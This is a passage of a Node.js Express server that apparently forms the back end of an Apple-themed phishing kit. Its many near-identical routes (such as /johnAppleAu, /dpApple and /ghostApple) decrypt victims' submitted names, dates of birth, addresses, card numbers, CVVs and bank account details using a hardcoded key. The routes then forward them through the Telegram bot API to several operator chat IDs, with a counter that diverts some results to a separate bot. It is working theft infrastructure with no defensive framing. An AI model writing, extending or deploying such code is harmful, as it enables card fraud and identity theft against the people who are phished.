    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${town}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleKelv:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1248378980,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount += 1;
      }
      res.send("Update Complete");
    });
});

//APPLE AU
//APPLE AU
//APPLE AU

app.options("/johnAppleAu", cors());

app.post("/johnAppleAu", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${town}\nState: ${state}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleJohn:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1248378980,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1442690533,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/kelvAppleAu", cors());

app.post("/kelvAppleAu", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${town}\nState: ${state}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleKelv:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1248378980,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1442690533,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/osbAppleAu", cors());

app.post("/osbAppleAu", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${town}\nState: ${state}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (blackTesco == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleOSBAU:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1248091713,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/fredAppleAu", cors());

app.post("/fredAppleAu", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${town}\nState: ${state}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (blackTesco == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFredAu:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5111234111,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/t1AppleAu", cors());

app.post("/t1AppleAu", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${town}\nState: ${state}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (blackTesco == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleT1Au:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1090540781,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco += 1;
      }
      res.send("Update Complete");
    });
});

//APPLE
//APPLE
//APPLE

app.options("/dpApple", cors());

app.post("/dpApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (dpFullz == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        dpFullz = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleDPc:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5582405778,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        dpFullz += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/rondoApple", cors());

app.post("/rondoApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleRondo:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5598032330,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/ghostApple", cors());

app.post("/ghostApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleGhost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5781274308,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/smokedApple", cors());

app.post("/smokedApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
